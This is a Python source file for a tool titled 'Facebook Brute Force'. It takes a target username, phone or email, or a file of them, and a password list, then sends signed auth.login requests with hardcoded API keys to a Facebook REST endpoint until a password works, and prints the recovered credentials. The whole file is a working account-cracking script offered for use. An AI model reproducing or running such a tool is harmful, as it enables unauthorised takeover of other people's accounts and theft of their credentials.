import os
import sys
import urllib.request
import hashlib
import urllib.parse

# ANSI escape code for colors
ORANGE = '\033[93m'
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

def clear_screen():
    os.system('clear')

def print_logo():
    clear_screen()
    print(GREEN + """
    o8o                                                 oooo  
    `"'                                                 `888    
   oooo  .oooo.   ooo. .oo.  .oo.    .oooo.    .oooo.    888  
   `888 `P  )88b  `888P"Y88bP"Y88b  `P  )88b  `P  )88b   888  
    888  .oP"888   888   888   888   .oP"888   .oP"888   888  
    888 d8(  888   888   888   888  d8(  888  d8(  888   888  
    888 `Y888""8o o888o o888o o888o `Y888""8o `Y888""8o o888o 
    888                                                       
.o. 88P                                                       
`Y888P """ + RESET)

API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"
LOGIN_USERNAME = "admin"
LOGIN_PASSWORD = "admin"

def login():
    while True:
        username = input("[*] Enter your username: ")
        password = input("[*] Enter your password: ")
        if username == LOGIN_USERNAME and password == LOGIN_PASSWORD:
            print("[+] Login successful!")
            break
        else:
            print("[-] Invalid username or password. Please try again.")

def crack_one_account():
    target_user = input("[*] Enter target username, phone, or email: ")
    passlist_path = input("[*] Set PATH to passlist: ")

    if os.path.exists(passlist_path):
        print("\nCracking account for user:", target_user)
        passlist = open(passlist_path, "r").read().split("\n")
        print("  Loaded:", len(passlist))
        print("  Cracking, please wait ...")

        for passwd in passlist:
            sys.stdout.write("\r[*] Trying {}".format(passwd.strip()))
            sys.stdout.flush()

            sig = f"api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={target_user}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={passwd.strip()}return_ssl_resources=0v=1.0{API_SECRET}"
            xx = hashlib.md5(sig.encode()).hexdigest()

            # Encode the password before forming the URL
            passwd_encoded = urllib.parse.quote_plus(passwd.strip())
            data = f"api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={target_user}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={passwd_encoded}&return_ssl_resources=0&v=1.0&sig={xx}"

            try:
                response = urllib.request.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read().decode()
                if "checkpoint" in response:
                    print("\n\n[+] Account is locked due to checkpoint.")
                    break
                elif "error" in response:
                    pass
                else:
                    print("\n\n[+] Found password!")
                    print("\n[+] Username:", GREEN + target_user + RESET)
                    print("[+] Password:", RED + passwd.strip() + RESET)
                    break
            except urllib.error.URLError as e:
                print("\nError:", e.reason)
                break

        print("\n\n[!] Good Luck !.")

    else:
        print("Error: No such file or directory")

def crack_many_accounts():
    users_file_path = input("[*] Set PATH to file containing usernames: ")
    passlist_path = input("[*] Set PATH to passlist: ")

    if os.path.exists(users_file_path) and os.path.exists(passlist_path):
        with open(users_file_path, 'r') as users_file:
            for target_user in users_file:
                target_user = target_user.strip()
                print("\nCracking account for user:", target_user)
                if os.path.exists(passlist_path):
                    passlist = open(passlist_path, "r").read().split("\n")
                    print("  Loaded:", len(passlist))
                    print("  Cracking, please wait ...")
                    for passwd in passlist:
                        sys.stdout.write("\r[*] Trying {}".format(passwd.strip()))
                        sys.stdout.flush()
                        sig = f"api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={target_user}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={passwd.strip()}return_ssl_resources=0v=1.0{API_SECRET}"
                        xx = hashlib.md5(sig.encode()).hexdigest()
                        # Encode the password before forming the URL
                        passwd_encoded = urllib.parse.quote_plus(passwd.strip())
                        data = f"api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={target_user}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={passwd_encoded}&return_ssl_resources=0&v=1.0&sig={xx}"
                        try:
                            response = urllib.request.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read().decode()
                            if "checkpoint" in response:
                                print("\n\n[+] Account is locked due to checkpoint.")
                                break
                            elif "error" in response:
                                pass
                            else:
                                print("\n\n[+] Found password!")
                                print("\n[+] Username:", GREEN + target_user + RESET)
                                print("[+] Password:", RED + passwd.strip() + RESET)
                                break
                        except urllib.error.URLError as e:
                            print("\nError:", e.reason)
                            break
                    print("\n\n[!] Done.")
                else:
                    print("Error: No such file or directory")
    else:
        print("Error: No such file or directory")

def main():
    print_logo()
    print("[+] Facebook Brute Force\n")
    try:
        login()
        print("Select the mode:")
        print(ORANGE + "1. Crack 1 account" + RESET)
        print(ORANGE + "2. Crack many accounts" + RESET)

        mode = int(input("Enter your choice: "))

        if mode == 1:
            crack_one_account()
        elif mode == 2:
            crack_many_accounts()
        else:
            print("Invalid choice!")

    except KeyboardInterrupt:
        print("\nError: Keyboard interrupt")

if __name__ == "__main__":
    main()

